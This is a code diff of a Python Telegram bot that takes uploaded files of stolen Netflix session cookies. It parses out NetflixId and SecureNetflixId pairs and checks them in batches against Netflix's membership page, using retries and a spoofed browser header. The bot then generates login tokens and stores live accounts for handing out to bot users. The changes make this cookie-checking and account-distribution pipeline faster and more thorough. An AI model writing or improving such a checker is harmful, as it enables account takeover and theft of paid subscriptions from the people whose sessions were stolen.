@@ -1,7 +1,6 @@
 import sys
 import asyncio
 
-
 # Configure UTF-8 output for Windows console unicode support
 if hasattr(sys.stdout, 'reconfigure'):
     sys.stdout.reconfigure(encoding='utf-8')
@@ -88,10 +87,11 @@ FORCE_JOIN_CHANNELS = [
     {"id": "@Senzo_Official", "link": "https://t.me/Senzo_Official"},
 ]
 
-
 WORKING_COOLDOWN_MINUTES = 10
 MAX_ACCOUNTS_PER_USER = 3
 REPORT_TIMEOUT_MINUTES = 30
+MAX_CHECK_RETRIES = 3
+CHECK_BATCH_SIZE = 10
 
 # ============================================================
 # DATABASE CLASS (TURSO & SQLITE3 COMPATIBLE WRAPPER)
@@ -264,6 +264,11 @@ class Database:
             cur.execute(query, params)
         else:
             cur.execute(query)
+        return CursorWrapper(cur)
+    
+    def executemany(self, query, params_list) -> CursorWrapper:
+        cur = self.conn.cursor()
+        cur.executemany(query, params_list)
         return CursorWrapper(cur)
     
     def commit(self):
@@ -480,6 +485,32 @@ def save_account(email: str, country: str, plan: str, cookies: str, nftoken: str
     db.commit()
     return cur.lastrowid
 
+def save_accounts_batch(accounts_data: List[Dict]) -> int:
+    """Batch insert multiple accounts for better performance."""
+    if not accounts_data:
+        return 0
+    
+    query = '''
+        INSERT INTO accounts (email, country, plan, cookies, nftoken, nftoken_expiry, source_file, last_checked)
+        VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
+    '''
+    params_list = [
+        (
+            acc["email"],
+            acc["country"],
+            acc["plan"],
+            acc["cookies"],
+            acc["nftoken"],
+            acc["nftoken_expiry"],
+            acc["source_file"],
+        )
+        for acc in accounts_data
+    ]
+    
+    cur = db.executemany(query, params_list)
+    db.commit()
+    return cur.rowcount
+
 def get_all_users() -> List[Dict]:
     res = db.execute('SELECT user_id, username, first_name, joined_at, is_banned, is_admin FROM users ORDER BY joined_at DESC')
     rows = res.fetchall()
@@ -648,7 +679,6 @@ def can_get_account(user_id: int) -> Tuple[bool, str]:
                     remaining = 1
                 return False, f"⏳ Please wait {remaining} minute(s) before getting another account."
 
-
     if user["accounts_used"] >= MAX_ACCOUNTS_PER_USER:
         return False, f"⚠️ You have reached the maximum limit of {MAX_ACCOUNTS_PER_USER} accounts per user."
     
@@ -716,6 +746,80 @@ def get_account_history(user_id: int) -> List[Dict]:
         }
         for row in rows
     ]
+
+# ============================================================
+# IMPROVED COOKIE EXTRACTION
+# ============================================================
+
+def extract_cookie_pairs(content: str) -> List[Tuple[str, Optional[str]]]:
+    """
+    Extract NetflixId and SecureNetflixId pairs from content.
+    Supports: .txt, .json, and raw cookie strings.
+    Returns list of (netflix_id, secure_netflix_id) tuples.
+    """
+    pairs = []
+    
+    # Try JSON parsing first
+    try:
+        data = json.loads(content)
+        if isinstance(data, dict):
+            # Single object
+            netflix_id = data.get("NetflixId") or data.get("netflix_id")
+            secure_id = data.get("SecureNetflixId") or data.get("secure_netflix_id")
+            if netflix_id:
+                pairs.append((str(netflix_id).strip('"\''), str(secure_id).strip('"\'') if secure_id else None))
+                return pairs
+        elif isinstance(data, list):
+            # Array of objects
+            for item in data:
+                if isinstance(item, dict):
+                    netflix_id = item.get("NetflixId") or item.get("netflix_id")
+                    secure_id = item.get("SecureNetflixId") or item.get("secure_netflix_id")
+                    if netflix_id:
+                        pairs.append((str(netflix_id).strip('"\''), str(secure_id).strip('"\'') if secure_id else None))
+            return pairs
+    except Exception:
+        pass
+    
+    # Try extracting from JSON-like string with regex
+    json_pattern = r'\{[^{}]*"NetflixId"[^{}]*\}'
+    json_matches = re.findall(json_pattern, content, re.IGNORECASE)
+    for match in json_matches:
+        try:
+            obj = json.loads(match)
+            netflix_id = obj.get("NetflixId") or obj.get("netflix_id")
+            secure_id = obj.get("SecureNetflixId") or obj.get("secure_netflix_id")
+            if netflix_id:
+                pairs.append((str(netflix_id).strip('"\''), str(secure_id).strip('"\'') if secure_id else None))
+        except Exception:
+            pass
+    
+    # Fallback: Direct regex scanning for cookie strings
+    if not pairs:
+        # Pattern for NetflixId
+        netflix_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
+        secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
+        
+        netflix_matches = netflix_pattern.findall(content)
+        secure_matches = secure_pattern.findall(content)
+        
+        # Pair them up sequentially
+        for i, nid in enumerate(netflix_matches):
+            nid_clean = nid.strip('"\'')
+            sid_clean = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
+            pairs.append((nid_clean, sid_clean))
+    
+    # Final fallback: Look for any alphanumeric string that looks like a NetflixId
+    if not pairs:
+        # NetflixId is typically 40+ characters of alphanumeric + underscores
+        id_pattern = re.compile(r'[A-Za-z0-9_]{40,}')
+        potential_ids = id_pattern.findall(content)
+        for pid in potential_ids:
+            # Check if it looks like a NetflixId (starts with specific pattern)
+            if pid.startswith(('A', 'B', 'C', 'D', 'E', 'F')):
+                pairs.append((pid, None))
+    
+    return pairs
 
 # ============================================================
 # NFToken Generator
@@ -800,120 +904,124 @@ def generate_nftoken(netflix_id: str) -> Tuple[Optional[str], Optional[str]]:
     return None, None
 
 # ============================================================
-# COOKIE PARSER & ACCOUNT CHECKER
+# IMPROVED ACCOUNT CHECKER WITH RETRY
 # ============================================================
-def extract_cookies_from_text(content: str) -> List[Dict]:
-    cookies = []
-    netflix_id_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"]+)', re.IGNORECASE)
-    secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"]+)', re.IGNORECASE)
-    
-    netflix_id = netflix_id_pattern.search(content)
-    secure_id = secure_pattern.search(content)
-    
-    if netflix_id:
-        cookies.append({
-            "name": "NetflixId",
-            "value": netflix_id.group(1).strip('"\''),
-            "domain": ".netflix.com",
-            "path": "/",
-            "secure": False,
-        })
-    if secure_id:
-        cookies.append({
-            "name": "SecureNetflixId",
-            "value": secure_id.group(1).strip('"\''),
-            "domain": ".netflix.com",
-            "path": "/",
-            "secure": True,
-        })
-    
-    try:
-        data = json.loads(content)
-        if isinstance(data, dict) and "cookies" in data:
-            for cookie in data["cookies"]:
-                if cookie.get("name") in ["NetflixId", "SecureNetflixId"]:
-                    cookies.append({
-                        "name": cookie["name"],
-                        "value": cookie["value"],
-                        "domain": cookie.get("domain", ".netflix.com"),
-                        "path": cookie.get("path", "/"),
-                        "secure": cookie.get("secure", False),
-                    })
-    except Exception:
-        pass
-    
-    return cookies
 
-def check_account(cookies: List[Dict]) -> Dict:
+def check_account_sync(cookies: List[Dict]) -> Dict:
+    """Synchronous account checker with retry logic."""
     if not cookies:
         return {"valid": False, "error": "No cookies found"}
     
-    cookie_dict = {c["name"]: c["value"] for c in cookies}
+    cookie_dict = {c["name"]: c["value"] for c in cookies if c.get("value")}
     if "NetflixId" not in cookie_dict:
         return {"valid": False, "error": "Missing NetflixId cookie"}
     
-    session = requests.Session()
-    session.cookies.update(cookie_dict)
+    for attempt in range(MAX_CHECK_RETRIES):
+        try:
+            session = requests.Session()
+            session.cookies.update(cookie_dict)
+            session.headers.update({
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive",
+                "Upgrade-Insecure-Requests": "1",
+            })
+            
+            response = session.get(
+                "https://www.netflix.com/account/membership",
+                timeout=15,
+                verify=False,
+                allow_redirects=True
+            )
+            
+            if response.status_code != 200:
+                if attempt < MAX_CHECK_RETRIES - 1:
+                    time.sleep(1)
+                    continue
+                return {"valid": False, "error": f"HTTP {response.status_code}"}
+            
+            # Check if redirected to login
+            if "login" in response.url.lower():
+                if attempt < MAX_CHECK_RETRIES - 1:
+                    time.sleep(1)
+                    continue
+                return {"valid": False, "error": "Expired or invalid cookie (Redirected to login)"}
+            
+            text = response.text
+            info = {}
+            
+            email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', text)
+            if email_match:
+                info["email"] = email_match.group(1)
+            else:
+                # Fallback email extraction
+                email_fallback = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
+                if email_fallback:
+                    info["email"] = email_fallback.group(1)
+            
+            country_match = re.search(r'"countryOfSignup":\s*"([^"]+)"', text)
+            if country_match:
+                info["country"] = country_match.group(1)
+            else:
+                country_fallback = re.search(r'"countryCode":\s*"([^"]+)"', text)
+                if country_fallback:
+                    info["country"] = country_fallback.group(1)
+            
+            plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', text)
+            if plan_match:
+                info["plan"] = plan_match.group(1)
+            else:
+                plan_fallback = re.search(r'(Premium|Standard|Basic|Mobile)', text, re.IGNORECASE)
+                if plan_fallback:
+                    info["plan"] = plan_fallback.group(1).title()
+            
+            is_subscribed = (
+                "current_member" in text.lower()
+                or "premium" in text.lower()
+                or "standard" in text.lower()
+                or "basic" in text.lower()
+                or "mobile" in text.lower()
+                or "member" in text.lower()
+            )
+            
+            # If we got this far and we have a valid session, it's a valid account
+            if not is_subscribed:
+                return {"valid": True, "info": info, "subscribed": False}
+            
+            nftoken, expiry = generate_nftoken(cookie_dict["NetflixId"])
+            
+            return {
+                "valid": True,
+                "subscribed": True,
+                "info": info,
+                "nftoken": nftoken,
+                "nftoken_expiry": expiry,
+            }
+            
+        except requests.exceptions.Timeout:
+            if attempt < MAX_CHECK_RETRIES - 1:
+                time.sleep(1)
+                continue
+            return {"valid": False, "error": "Timeout"}
+        except requests.exceptions.ConnectionError:
+            if attempt < MAX_CHECK_RETRIES - 1:
+                time.sleep(1)
+                continue
+            return {"valid": False, "error": "Connection error"}
+        except Exception as e:
+            if attempt < MAX_CHECK_RETRIES - 1:
+                time.sleep(1)
+                continue
+            return {"valid": False, "error": str(e)}
     
-    try:
-        response = session.get(
-            "https://www.netflix.com/account/membership",
-            headers={
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept-Encoding": "identity",
-            },
-            timeout=15,
-            verify=False
-        )
-        
-        if response.status_code != 200:
-            return {"valid": False, "error": f"HTTP {response.status_code}"}
-        
-        # Check if redirected to login
-        if "login" in response.url.lower():
-            return {"valid": False, "error": "Expired or invalid cookie (Redirected to login)"}
-        
-        text = response.text
-        info = {}
-        
-        email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', text)
-        if email_match:
-            info["email"] = email_match.group(1)
-        
-        country_match = re.search(r'"countryOfSignup":\s*"([^"]+)"', text)
-        if country_match:
-            info["country"] = country_match.group(1)
-        
-        plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', text)
-        if plan_match:
-            info["plan"] = plan_match.group(1)
-        
-        is_subscribed = (
-            "current_member" in text.lower()
-            or "premium" in text.lower()
-            or "standard" in text.lower()
-            or "basic" in text.lower()
-        )
-        
-        if not is_subscribed:
-            return {"valid": True, "info": info, "subscribed": False}
-        
-        nftoken, expiry = generate_nftoken(cookie_dict["NetflixId"])
-        
-        return {
-            "valid": True,
-            "subscribed": True,
-            "info": info,
-            "nftoken": nftoken,
-            "nftoken_expiry": expiry,
-        }
-        
-    except requests.exceptions.Timeout:
-        return {"valid": False, "error": "Timeout"}
-    except requests.exceptions.ConnectionError:
-        return {"valid": False, "error": "Connection error"}
-    except Exception as e:
-        return {"valid": False, "error": str(e)}
+    return {"valid": False, "error": "Max retries exceeded"}
+
+async def check_account_async(cookies: List[Dict]) -> Dict:
+    """Async wrapper for account checker."""
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(None, check_account_sync, cookies)
 
 # ============================================================
 # TELEGRAM BOT HANDLERS
@@ -947,7 +1055,7 @@ async def check_force_join(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> 
         raw_id = channel.get("channel_id", "")
         target_id = clean_channel_id(raw_id)
         if not target_id:
-            print(f"⚠️ Channel ID '{raw_id}' is invalid format for get_chat_member. Expected @username or numeric ID (-100xxx). Skipping.")
+            print(f"⚠️ Channel ID '{raw_id}' is invalid format. Skipping.")
             continue
             
         try:
@@ -955,11 +1063,10 @@ async def check_force_join(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> 
             if member.status in [ChatMember.LEFT, ChatMember.KICKED]:
                 return False
         except Exception as e:
-            print(f"⚠️ Could not check member status for channel '{raw_id}' (target: {target_id}): {e}")
+            print(f"⚠️ Could not check member status for channel '{raw_id}': {e}")
             continue
     
     return True
-
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -1070,7 +1177,6 @@ async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
             await query.answer("❌ You haven't joined all channels yet! Please join and try again.", show_alert=True)
         except Exception:
             pass
-
 
 async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1260,7 +1366,6 @@ Account: `{account.get('email', 'Unknown')}` ({account.get('plan', 'Unknown')})
                     parse_mode=ParseMode.MARKDOWN,
                 )
         except Exception:
-            # Fallback to plain text message if send_photo fails
             try:
                 await bot.send_message(
                     admin_id,
@@ -1380,6 +1485,153 @@ async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
 
 # ============================================================
+# IMPROVED FILE UPLOAD HANDLER
+# ============================================================
+
+async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Not authorized!")
+        return
+    
+    if not context.user_data.get("waiting_for_upload"):
+        return
+    
+    document = update.message.document
+    if not document:
+        await update.message.reply_text("❌ Please send a file.")
+        return
+    
+    file_name = document.file_name
+    if not file_name.lower().endswith(('.txt', '.json')):
+        await update.message.reply_text("❌ Please send a .txt or .json file.")
+        return
+    
+    await update.message.reply_text("⏳ Processing file... This may take a while.")
+    
+    try:
+        file = await context.bot.get_file(document.file_id)
+        file_content = await file.download_as_bytearray()
+        content = file_content.decode('utf-8', errors='ignore')
+        
+        # Extract all cookie pairs properly
+        cookie_pairs = extract_cookie_pairs(content)
+        
+        if not cookie_pairs:
+            await update.message.reply_text("❌ No Netflix cookie pairs found in file.")
+            context.user_data["waiting_for_upload"] = False
+            return
+        
+        total = len(cookie_pairs)
+        progress_msg = await update.message.reply_text(f"🔄 Checking {total} accounts... 0%")
+        
+        valid = 0
+        added = 0
+        invalid = 0
+        errors = 0
+        accounts_to_save = []
+        
+        # Process in batches for better performance
+        batch_size = CHECK_BATCH_SIZE
+        for i in range(0, total, batch_size):
+            batch = cookie_pairs[i:i+batch_size]
+            tasks = []
+            
+            for netflix_id, secure_id in batch:
+                cookie_list = [
+                    {"name": "NetflixId", "value": netflix_id, "domain": ".netflix.com", "path": "/", "secure": False}
+                ]
+                if secure_id:
+                    cookie_list.append({
+                        "name": "SecureNetflixId", 
+                        "value": secure_id, 
+                        "domain": ".netflix.com", 
+                        "path": "/", 
+                        "secure": True
+                    })
+                tasks.append(check_account_async(cookie_list))
+            
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            for idx, result in enumerate(results):
+                if isinstance(result, Exception):
+                    errors += 1
+                    continue
+                
+                netflix_id = batch[idx][0]
+                secure_id = batch[idx][1]
+                
+                if result.get("valid") and result.get("subscribed"):
+                    info = result.get("info", {})
+                    email = info.get("email", f"user_{random.randint(1000, 9999)}@netflix.com")
+                    country = info.get("country", "Unknown")
+                    plan = info.get("plan", "Unknown")
+                    nftoken = result.get("nftoken")
+                    nftoken_expiry = result.get("nftoken_expiry")
+                    
+                    # Build cookie string
+                    cookie_str = f"NetflixId\tTRUE\t/\tFALSE\t0\tNetflixId\t{netflix_id}\n"
+                    if secure_id:
+                        cookie_str += f"SecureNetflixId\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t{secure_id}"
+                    
+                    accounts_to_save.append({
+                        "email": email,
+                        "country": country,
+                        "plan": plan,
+                        "cookies": cookie_str,
+                        "nftoken": nftoken,
+                        "nftoken_expiry": nftoken_expiry,
+                        "source_file": file_name,
+                    })
+                    valid += 1
+                    added += 1
+                elif result.get("valid"):
+                    invalid += 1
+                else:
+                    invalid += 1
+            
+            # Update progress
+            processed = min(i + len(batch), total)
+            percent = int((processed / total) * 100)
+            await progress_msg.edit_text(
+                f"🔄 Checking accounts... {processed}/{total} ({percent}%)\n"
+                f"✅ Valid: {valid} | ❌ Invalid: {invalid} | ⚠️ Errors: {errors}"
+            )
+            
+            # Batch save every 50 accounts to avoid memory issues
+            if len(accounts_to_save) >= 50:
+                saved = save_accounts_batch(accounts_to_save)
+                accounts_to_save = []
+                await progress_msg.edit_text(
+                    f"🔄 Checking accounts... {processed}/{total} ({percent}%)\n"
+                    f"✅ Valid: {valid} | ❌ Invalid: {invalid} | ⚠️ Errors: {errors}\n"
+                    f"💾 Saved: {saved} accounts to database"
+                )
+        
+        # Save remaining accounts
+        if accounts_to_save:
+            save_accounts_batch(accounts_to_save)
+        
+        log_stock(user_id, file_name, total, added)
+        context.user_data["waiting_for_upload"] = False
+        
+        await progress_msg.edit_text(
+            f"✅ **Stock Upload Complete!**\n\n"
+            f"📁 File: {file_name}\n"
+            f"🔍 Total Checked: {total}\n"
+            f"✅ Valid & Added: {added}\n"
+            f"❌ Invalid: {invalid}\n"
+            f"⚠️ Errors: {errors}\n\n"
+            f"📊 New Total Available: {get_total_accounts()['total']}",
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error processing file: {str(e)}")
+        context.user_data["waiting_for_upload"] = False
+
+# ============================================================
 # ADMIN PANEL HANDLERS
 # ============================================================
 
@@ -1446,96 +1698,6 @@ async def admin_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.MARKDOWN,
     )
     context.user_data["waiting_for_upload"] = True
-
-async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Not authorized!")
-        return
-    
-    if not context.user_data.get("waiting_for_upload"):
-        return
-    
-    document = update.message.document
-    if not document:
-        await update.message.reply_text("❌ Please send a file.")
-        return
-    
-    file_name = document.file_name
-    if not file_name.lower().endswith(('.txt', '.json')):
-        await update.message.reply_text("❌ Please send a .txt or .json file.")
-        return
-    
-    await update.message.reply_text("⏳ Processing file... This may take a while.")
-    
-    try:
-        file = await context.bot.get_file(document.file_id)
-        file_content = await file.download_as_bytearray()
-        content = file_content.decode('utf-8', errors='ignore')
-        
-        cookies = extract_cookies_from_text(content)
-        
-        if not cookies:
-            await update.message.reply_text("❌ No Netflix cookies found in file.")
-            context.user_data["waiting_for_upload"] = False
-            return
-        
-        seen_ids = set()
-        unique_cookies = []
-        for c in cookies:
-            if c["name"] == "NetflixId" and c["value"] not in seen_ids:
-                seen_ids.add(c["value"])
-                unique_cookies.append(c)
-        
-        progress_msg = await update.message.reply_text(f"🔄 Checking {len(unique_cookies)} accounts...")
-        valid = 0
-        added = 0
-        
-        for i, cookie in enumerate(unique_cookies):
-            cookie_dict = {cookie["name"]: cookie["value"]}
-            for c in cookies:
-                if c["name"] == "SecureNetflixId" and c["value"]:
-                    cookie_dict["SecureNetflixId"] = c["value"]
-            
-            result = check_account([{"name": k, "value": v} for k, v in cookie_dict.items()])
-            
-            if result.get("valid") and result.get("subscribed"):
-                info = result.get("info", {})
-                email = info.get("email", f"user_{random.randint(1000, 9999)}@netflix.com")
-                country = info.get("country", "Unknown")
-                plan = info.get("plan", "Unknown")
-                nftoken = result.get("nftoken")
-                nftoken_expiry = result.get("nftoken_expiry")
-                
-                cookie_str = "\n".join([f"{k}\tTRUE\t/\tFALSE\t0\t{k}\t{v}" for k, v in cookie_dict.items()])
-                
-                save_account(email, country, plan, cookie_str, nftoken, nftoken_expiry, file_name)
-                added += 1
-                valid += 1
-            
-            if (i + 1) % 5 == 0 or (i + 1) == len(unique_cookies):
-                try:
-                    await progress_msg.edit_text(f"🔄 Checking accounts... {i+1}/{len(unique_cookies)} | Found valid: {valid}")
-                except Exception:
-                    pass
-        
-        log_stock(user_id, file_name, len(unique_cookies), added)
-        context.user_data["waiting_for_upload"] = False
-        
-        await progress_msg.edit_text(
-            f"✅ **Stock Upload Complete!**\n\n"
-            f"📁 File: {file_name}\n"
-            f"🔍 Total Checked: {len(unique_cookies)}\n"
-            f"✅ Valid & Added: {added}\n"
-            f"❌ Invalid: {len(unique_cookies) - added}\n\n"
-            f"📊 New Total Available: {get_total_accounts()['total']}",
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error processing file: {str(e)}")
-        context.user_data["waiting_for_upload"] = False
 
 async def admin_reports(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1652,8 +1814,7 @@ async def remove_channel_callback(update: Update, context: ContextTypes.DEFAULT_
     
     if user_id not in ADMIN_IDS:
         await query.answer("⛔ Not authorized!", show_alert=True)
-        return
-    
+        return    
     channel_id = query.data.replace("remove_ch_", "")
     remove_channel(channel_id)
     await query.edit_message_text(f"✅ Channel {channel_id} has been removed!")
@@ -1946,6 +2107,8 @@ def main():
     print(f"👤 Admin IDs: {ADMIN_IDS}")
     print(f"⏳ Cooldown: {WORKING_COOLDOWN_MINUTES} minutes")
     print(f"📦 Max Accounts Per User: {MAX_ACCOUNTS_PER_USER}")
+    print(f"🔍 Check Batch Size: {CHECK_BATCH_SIZE}")
+    print(f"🔄 Max Retries: {MAX_CHECK_RETRIES}")
     
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not BOT_TOKEN:
         print("❌ BOT_TOKEN is missing or not set in environment or .env file!")
